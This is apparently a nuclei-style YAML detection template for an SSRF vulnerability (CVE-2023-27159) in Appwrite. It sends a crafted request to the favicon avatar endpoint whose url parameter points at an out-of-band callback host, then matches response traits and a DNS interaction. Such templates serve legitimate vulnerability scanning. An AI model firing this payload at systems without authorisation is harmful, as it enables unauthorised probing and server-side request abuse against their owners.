id: poc-yaml-appwrite-ssrf

info:
  name: Appwrite Server-Side Request Forgery Vulnerability (CVE-2023-27159)
  author: ProjectDiscoveryAI
  severity: high
  tags: dnslog,ssrf,CVE-2023-27159

variables:
  reverse: '{{interactsh-url}}'

http:
  - raw:
      - |
        GET /v1/avatars/favicon?url=http://{{reverse}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 404
      - type: word
        part: body
        words:
          - "App.php"
      - type: word
        part: header
        words:
          - "Appwrite"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
